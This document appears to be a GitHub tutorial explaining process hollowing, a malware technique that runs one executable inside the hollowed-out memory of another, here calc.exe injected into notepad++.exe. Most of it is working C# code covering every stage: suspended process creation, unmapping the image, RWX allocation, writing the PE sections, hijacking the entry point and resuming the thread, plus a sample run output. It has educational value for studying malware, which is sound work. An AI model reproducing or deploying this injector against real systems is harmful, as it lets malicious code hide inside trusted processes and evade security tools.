# Process Hollowing
Understanding one of the the Process Hollowing technique used by Malware Authors

![PE Injection](https://user-images.githubusercontent.com/12537739/123103105-4688f480-d468-11eb-83a0-7a3ea3d8dff5.gif)


# Example Run

```sh
Injecting TvnViewer.exe into notepad++.exe
[+] Creating Victim Process notepad++.exe
        [*] Successfully created victim process notepad++.exe
[+] Retrieving Thread Handle of notepad++.exe
        [*] Thread Handle at  0x2E0
[+] Allocating unmanaged memory for ThreadContext of notepad++.exe
[+] Retrieving ThreadContext of notepad++.exe
[+] Retrieving ImageBase Address of notepad++.exe
        [*] notepad++.exe's ImageBase Address is 0xA5A7162010
[+] Allocating unmanaged memory for notepad++.exe's ImageBase
[+] Reading ImageBase from notepad++.exe's ImageBase Address
        [*] ImageBase is 0xA5A7162010
[+] Unmapping notepad++.exe's Image
        [*] Successfully unmapped...
[+] Retrieving E_LFANEW of TvnViewer.exe
        [*] E_LFANEW is 0xF0
[+] Retrieving TvnViewer.exe's ImageBase
        [*] ImageBase is 0x140000000
[+] Retrieving Size of TvnViewer.exe
        [*] Size is 0x125000
[+] Allocating space for TvnViewer.exe's Image
        [*] Space allocated at 0x5368709120
[+] Retrieving TvnViewer.exe's Header Size
        [*] Header Size is 0x400
[+] Writing Headers of TvnViewer.exe into notepad++.exe at 0x5368709120
        [*] Headers successfully written...
[+] Retrieving TvnViewer.exe's number of Sections
        [*] Number of sections is  6
[+] Copying Section 1
        [*] Name: .text
        [*] Relative Virtual Address: 0x1000
        [*] Size of Raw Data: 0xC5200
        [*] Pointer to Raw Data: 0x400

[+] Copying Section 2
        [*] Name: .rdata
        [*] Relative Virtual Address: 0xC7000
        [*] Size of Raw Data: 0x3CC00
        [*] Pointer to Raw Data: 0xC5600

[+] Copying Section 3
        [*] Name: .data
        [*] Relative Virtual Address: 0x104000
        [*] Size of Raw Data: 0x5800
        [*] Pointer to Raw Data: 0x102200

[+] Copying Section 4
        [*] Name: .pdata
        [*] Relative Virtual Address: 0x10D000
        [*] Size of Raw Data: 0xC800
        [*] Pointer to Raw Data: 0x107A00

[+] Copying Section 5
        [*] Name: .rsrc
        [*] Relative Virtual Address: 0x11A000
        [*] Size of Raw Data: 0x9000
        [*] Pointer to Raw Data: 0x114200

[+] Copying Section 6
        [*] Name: .reloc
        [*] Relative Virtual Address: 0x123000
        [*] Size of Raw Data: 0x1E00
        [*] Pointer to Raw Data: 0x11D200

[+] ReWriting TvnViewer.exe's ImageBase 0x140000000 in memory
       [*] ImageBase rewriting successful...
[+] ReWriting TvnViewer.exe's EntryPoint 0x140000000 in ThreadContext
       [*] EntryPoint rewriting successful...
[+] Setting ThreadContext
[+] All set and ready to go!
[+] Resuming Thread...
```
# TLDR

I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Process Hollowing` technique.


# Overview of  Process Hollowing aka (Process Replacement/RunPE)

Instead of injecting code into a host program (e.g., DLL injection), malware can perform a technique known as process hollowing. Process hollowing occurs when a malware unmaps (hollows out) the legitimate code from memory of the target process, and overwrites the memory space of the target process (e.g., svchost.exe) with a malicious executable.

![image](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt4bd1c915cefd3848/5e2f90f74c16654538e2ce6a/process-injection-techniques-blogs-runpe.gif)

The malware first creates a new process to host the malicious code in `SUSPENDED` mode. This is done by calling `CreateProcess` and setting the Process Creation Flag to `CREATE_SUSPENDED (0x00000004)`. The primary thread of the new process is created in a suspended state, and does not run until the `ResumeThread` function is called. Next, the malware needs to swap out the contents of the legitimate file with its malicious payload. This is done by unmapping the memory of the target process by calling either `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`. These two APIs basically release all memory pointed to by a section. Now that the memory is unmapped, the loader performs `VirtualAllocEx` to allocate new memory for the malware, and uses `WriteProcessMemory` to write each of the malware’s sections to the target process space. The malware calls `SetThreadContext` to point the `entrypoint` to a new code section that it has written. At the end, the malware resumes the suspended thread by calling `ResumeThread` to take the process out of suspended state.

# Creating our Victim Process

In order to achieve it we are first going to create our victim process, in my case,  `notepad++`, in a `SUSPENDED` state. 
In a `SUSPENDED` state, the victim process is loaded from the filesystem into memory but the primary thread does not run until the `ResumeThread` function is called.

We are going to use the `CreateProcessA` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

```cpp
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

## CreateProcessA Parameters

### lpApplicationName

This represents the process name that we want to create. Weirdly enough, this can be NULL. In the case where this is NULL, the process name must be the first white space–delimited token in the `lpCommandLine` parameter. 

I will go ahead and leave this parameter to be NULL and specify our process name at `lpCommandLine` parameter instead.

### lpCommandLine

Since our `lpApplicationName` is NULL, the first white space–delimited token of the command line specifies the process name. If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin. Furthermore, if we were to ommit our extension for our process, it will auto append `.exe`. Lets proceed to put the full path of `notepad++.exe`.

```cs
  string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
```

### lpProcessAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited. 

I will be putting it as NULL.

### lpThreadAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.

I will be putting it as NULL.

### bInheritHandles
If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited.

I will be putting it as FALSE.

### dwCreationFlags

The flags that control the priority class and the creation of the process. For a list of values, see [Process Creation Flags](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).

We want to create a `SUSPENDED` process. Thus we will be using the `CREATE_SUSPENDED` flag which has a value `0x4`.

### lpEnvironment

An environment block consists of a null-terminated block of null-terminated strings. Each string is in the following form:

`name=value\0`
We won't be needing it thus we will set it to NULL.

### lpStartupInfo

A pointer to a [STARTUPINFO](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure.

I ported the structure with the help from [PInvoke.Net StartupInfo](https://www.pinvoke.net/default.aspx/Structures/StartupInfo.html?diff=y).


### lpProcessInformation
A pointer to a [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information) structure that receives identification information about the new process.

I ported the structure with the help from [PInvoke.Net ProcessInformation](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

This is a very important structure as we would be using the `process and thread handles` from it.

## Code Example

Let's go ahead and create our victim process in a suspended state.

```cs
static void Main(string[] args)
{
    //Paths to our files
    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
    string virusPath = @"C:\Windows\System32\calc.exe";

    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
    IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);


    byte[] virusFileBytes = File.ReadAllBytes(virusPath);
    IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);

    #region Create Victim Process in Suspended State    
    
    
    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

    bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                        lpApplicationName: null,
                                        lpCommandLine: notepadPath,
                                        lpProcessAttributes: IntPtr.Zero,
                                        lpThreadAttributes: IntPtr.Zero,
                                        bInheritHandles: false,
                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                        lpEnvironment: IntPtr.Zero,
                                        lpCurrentDirectory: null,
                                        lpStartupInfo: startupInfo,
                                        lpProcessInformation: processInformation
                                    );
    if (couldNotCreateProcess)
    {
        Console.WriteLine("Failed to create process...");
    }

    Console.WriteLine("Successfully created victim process...");

    #endregion
}
```

![image](https://user-images.githubusercontent.com/12537739/121704357-47d02e00-cb06-11eb-8847-46063bc4c2c2.png)

We have successfully loaded our victim executable to memory, and it is now in a suspended state.

# Getting ThreadContext

The `ThreadContext` contains useful information like the values of the `EntryPoint` or `ImageBase`. These information can easily be obtained from the PE File itself, but it might not always be accurate due to [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization).

Hence we need to get these values dynamically, once the process has been loaded, in our case, once the process `notepad++.exe` is stalled in the `SUSPENDED` state.

So now how do we get the `ThreadContext`?

We will be utilizing the function `GetThreadContext`. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext).

```cpp
BOOL GetThreadContext(
  HANDLE    hThread,
  LPCONTEXT lpContext
);
```

## GetThreadContext Parameters

### hThread

A handle to the thread whose context is to be retrieved. 

Previously, when we called `CreateProcessA`, we passed in a `lpProcessInformation` which is of type [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information). The [structure](https://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html) looks as follows in `C#`.

```cs
/// <summary>
/// Contains information about a newly created process and its primary thread. 
/// 
/// <see cref="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information"/>\
/// <seealso cref="https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html"/>
/// </summary>
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    /// <summary>
    /// A handle to the newly created process. 
    /// The handle is used to specify the process in all functions that perform operations on the process object.
    /// </summary>
    public IntPtr hProcess;

    /// <summary>
    /// A handle to the primary thread of the newly created process. 
    /// The handle is used to specify the thread in all functions that perform operations on the thread object.
    /// </summary>
    public IntPtr hThread;


    public int dwProcessId;
    public int dwThreadId;
}
```

From the above, we can get the handle to the thread using `hThread`.

```cs
IntPtr victimThreadHandle = processInformation.hThread;
```


### lpContext

A pointer to a CONTEXT structure that receives the appropriate context of the specified thread. The value of the ContextFlags member of this structure specifies which portions of a thread's context are retrieved. The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.

I ported the structure with the help from [PInvoke.Net CONTEXT64](http://www.pinvoke.net/default.aspx/kernel32/GetThreadContext.html).

Next we need to create the context structure specifying `ContextFlags`. The flag to use would be `CONTEXT_FULL` to get the full context data.

```cs
 PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
```

As the [context](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) structure needs to be aligned as stated in microsofts documentation,

> Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.

```cpp
typedef struct DECLSPEC_ALIGN(16) DECLSPEC_NOINITALL _CONTEXT { ... }
```

The `CONTEXT` structure needs to be 16 bit aligned.

I have created an `Allocate` function which accepts the size of dynamic memory needed and the alignment value.

We now have to allocate unmanaged memory space for the context structure.

```cs
IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
```

Now that we have allocated space, I am going to translate the context from my managed memory structure variable `victimThreadContext` to the unmanaged memory by

```cs
 Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);
```

Once the translation has been performed, we can now call `GetThreadContext` as follows.

```cs
PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
```
This will fill up all the context details into the unmanaged memory pointer `pVictimeThreadContext`.

For easier reading, I translated the unmanaged memory back to our structure by

```cs
victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
```

## Code Example
```cs
IntPtr victimThreadHandle = processInformation.hThread;
            
PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };

IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);

Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);

PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);

victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
```

# Getting ImageBase from our victim process

Now why did we get the `ThreadContext` of our victim process in the first place? 

It is needed as the context contains details regarding `ImageBase` and `EntryPoint`. Lets tackle the retrieval of `ImageBase`.

Security Researchers found that the register Rdx was pointing to a memory location. `16 bytes` after this location contains the address of the location of ImageBase.

Thus we could get the `ImageBase` location's address by
```cs
ulong rdx = victimThreadContext.Rdx;
ulong victimImageBaseAddress = rdx + 16;
```

Now that we got the victim's image base address, we can read the victim's `ImageBase` value from it by using the function `ReadProcessMemory`. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory).

```cpp
BOOL ReadProcessMemory(
  HANDLE  hProcess,
  LPCVOID lpBaseAddress,
  LPVOID  lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesRead
);
```

## ReadProcessMemory Parameters

### hProcess

A handle to the process with memory that is being read. 

Just like how we got the `Thread Handle` previously from the `PROCESS_INFORMATION` structure, we can also obtain the `Process Handle` in a similar fashion.

```cs
IntPtr victimProcessHandle = processInformation.hProcess;
```

### lpBaseAddress
A pointer to the base address in the specified process from which to read.

We want to start reading from `victimImageBaseAddress`.

### lpBuffer

A pointer to a buffer that receives the contents from the address space of the specified process.

Let's create `8 bytes` of unamanaged memory to store the `ImageBase`.

```cs
IntPtr victimImageBase = Marshal.AllocHGlobal(8);
```

Then we can perform the read,
```cs
PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
```

### nSize

The number of bytes to be read from the specified process.

For 32-bit applications, the `ImageBase` is 4 bytes whereas for 64-bit, its 8 bytes.

We will be reading 8 bytes as this injector is build to support for 64-bit applications.

### lpNumberOfBytesRead
A pointer to a variable that receives the number of bytes transferred into the specified buffer.

For simplicity, I will be ignoring this field by using `C#'s` discard variable, `_`.

## Code Example

```cs
ulong rdx = victimThreadContext.Rdx;
ulong victimImageBaseAddress = rdx + 16;
IntPtr victimProcessHandle = processInformation.hProcess;
IntPtr victimImageBase = Marshal.AllocHGlobal(8);
PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
```

# Hollowing our Victim Process

Great! Now we have the victim's `ImageBase`. We are going to hollow out the victim's memory starting from its `ImageBase`.

We will be using the function `ZwUnmapViewOfSection`.

More details of it can be found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection).

```cpp
NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
  HANDLE ProcessHandle,
  PVOID  BaseAddress
);
```

## ZwUnmapViewOfSection Parameters

### ProcessHandle

Previously, we called the `CreateProcessA` function. This function helps fill up our `PROCESS_INFORMATION` block.

`PROCESS_INFORMATION` contains the handle to our victim process.

Thus we can get the process handle from it using

```cs
IntPtr processHandle = processInformation.hProcess;
```

### BaseAddress

We have already retrieved the `ImageBase` previously. We will be hollowing out the entire victim image, thus we start from its `ImageBase`.


## Code Example

```cs
if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
{
    Console.WriteLine("Failed to unmap section...");
    return;
}
```

# Allocating Space for Our Malware Image

In order to make it easier for us to map the malware image, in our case, 'Calculator.exe', we are going allocate space to rebase the memory in terms of its own `ImageBase` and `Size`.

We are going to use the `VirtualAllocEx` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex).

```cpp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

## VirtualAllocEx Parameters

### hProcess

The handle to the process.

We have already obtained the handle to the process previously.

### lpAddress

The pointer that specifies a desired starting address for the region of pages that you want to allocate.

We want to start allocating from the `ImageBase` of the malware address so that everything fits perfectly.

So now we need to find its `ImageBase` and `Size` by looking into the internals of the PE File.

![image](https://user-images.githubusercontent.com/12537739/121771500-4bb18e00-cba2-11eb-92b7-034b4aefdd38.png)

As we can see from the image above, we need to get to the `COFF Header`. 

How do we get to the `COFF Header`? 

At the `DOS_HEADER`, we have a 4 byte integer variable called `E_LFANEW`. This is located at an offset `0x3C` from the start of the file.

`E_LFANEW` contains the offset to get to the `COFF Header`.

Thus to get `E_LFANEW`, 

```cs
int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW); // PInvoke.Offsets.E_LFANEW refers to 0x3C
```

Once we get to the `COFF Header` using the `E_LFANEW`, we can see from the image above that the `ImageBase` is at `0x34` offset away and 4 bytes long. However, this is for 32-bit applications. For 64-bit applicaations, there are at a offset `0x30` away and are 8 bytes long.



Hence to get the `ImageBase`, 

```cs
long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
```


### dwSize

The size of the region of memory to allocate, in bytes.

![image](https://user-images.githubusercontent.com/12537739/127744292-58773753-9422-4873-8599-e6a63e561b2d.png)


From the image above, we can see that the `SizeOfImage` is `0x50` bytes away from the `COFF` header.

Hence we can obtain the `SizeOfImage` by

```cs
uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
```

### flAllocationType

The type of memory allocation.

We will be using `MEM_COMMIT`, `MEM_RESERVE`.

### flProtect

The memory protection for the region of pages to be allocated.

We will be using `PAGE_EXECUTE_READWRITE`


## Code Example

```cs
int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW);
long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);

```

# Rewriting PE Headers
Now that we have allocated space for the malware, we are going to first copy the headers.


We are going to use the `WriteProcessMemory` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

```cpp
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

## WriteProcessMemory Parameters

### hProcess

A handle to the process memory to be modified.

This will be our `victimProcessHandle` that we obtained earlier.

### lpBaseAddress

A pointer to the base address in the specified process to which data is written.

This will be the `allocatedNewRegionForVirus` which we obtained from `VirtualAllocEx`.

### lpBuffer

A pointer to the buffer that contains data to be written in the address space of the specified process.

This will be our pointer to the malware image, in our case, `Calculator.exe`.

### nSize

The number of bytes to be written to the specified process.

We need to get the size of the headers from the PE file. It is at an offset `0x54` from the start of the PE Header.

```cs
uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
```


### lpNumberOfBytesWritten

For simplicity, I will be ignoring this field by using `C#'s` discard variable, `_`.

## Code Example

```cs
 uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
 if (!PInvoke.WriteProcessMemory(victimProcessHandle, allocatedNewRegionForVirus, virusFilePointer, sizeOfVirusHeaders, out _))
 {
     Console.WriteLine("Writing headers failed...");
     return;
 };
```

# Writing the Sections

In order to locate and write the sections, we need 3 important information. The `NumberOfSections`, `SizeOfOptionalHeaders` and the `SizeOfImageSectionHeader`.


![image](https://user-images.githubusercontent.com/12537739/123084407-a7f29880-d453-11eb-94ee-bcc60de47843.png)


From the image above, we can obtain the `NumberOfSections` and `SizeOfOptionalHeaders` by

```cs
int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
```

Then I got the `IMAGE_SECTION_HEADER` definition from [PINVOKE.NET](http://pinvoke.net/default.aspx/Structures/IMAGE_SECTION_HEADER.html).

```cs
[StructLayout(LayoutKind.Explicit)]
public struct IMAGE_SECTION_HEADER
{
    [FieldOffset(0)]
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public char[] Name;

    [FieldOffset(8)]
    public UInt32 VirtualSize;

    [FieldOffset(12)]
    public UInt32 VirtualAddress;

    [FieldOffset(16)]
    public UInt32 SizeOfRawData;

    [FieldOffset(20)]
    public UInt32 PointerToRawData;

    [FieldOffset(24)]
    public UInt32 PointerToRelocations;

    [FieldOffset(28)]
    public UInt32 PointerToLinenumbers;

    [FieldOffset(32)]
    public UInt16 NumberOfRelocations;

    [FieldOffset(34)]
    public UInt16 NumberOfLinenumbers;

    [FieldOffset(36)]
    public DataSectionFlags Characteristics;

    public string Section
    {
        get { return new string(Name); }
    }
}
```

![image](https://user-images.githubusercontent.com/12537739/123085946-6e229180-d455-11eb-8bce-3ae34b1d4f24.png)


With that, we can get the size of a `Section`.
```cs
int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
```

We can now loop through all the sections and map them.

```cs
 int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
 int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
 int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
 for (int i = 0; i < numberOfSections; i++)
 {
     IntPtr sectionHeaderPointer = virusFilePointer + virusElfanew + 0x18 + sizeOfOptionalHeader + (i * sizeOfImageSectionHeader);
     PInvoke.IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<PInvoke.IMAGE_SECTION_HEADER>(sectionHeaderPointer);

     uint virtualAddress = sectionHeader.VirtualAddress;
     uint sizeOfRawData = sectionHeader.SizeOfRawData;
     uint pointerToRawData = sectionHeader.PointerToRawData;

     byte[] bRawData = new byte[sizeOfRawData];
     Buffer.BlockCopy(virusFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);

     PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)(virusImageBase + virtualAddress), Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0), (uint)bRawData.Length, out _);

 }
```

# Update our ThreadContext and Resume

We need to update our ThreadContext's `ImageBase` and `EntryPoint`.

```cs
 
 byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);
 if (!PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)victimImageBaseAddress, bImageBase, 0x8, out _))
 {
     Console.WriteLine("Rewriting image base failed...");
     return;
 }
 
 int virusEntryPointRVA = Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x28);
 victimThreadContext.Rcx = (ulong)allocatedNewRegionForVirus +  (ulong)virusEntryPointRVA;
 Marshal.StructureToPtr(victimThreadContext, pVictimThreadContext, true);

 PInvoke.SetThreadContext(victimThreadHandle, pVictimThreadContext);
 
```

# Resume Thread

Finally, we resume the thread.

```cs
PInvoke.ResumeThread(victimThreadHandle);
```

Process Hollowing Complete.
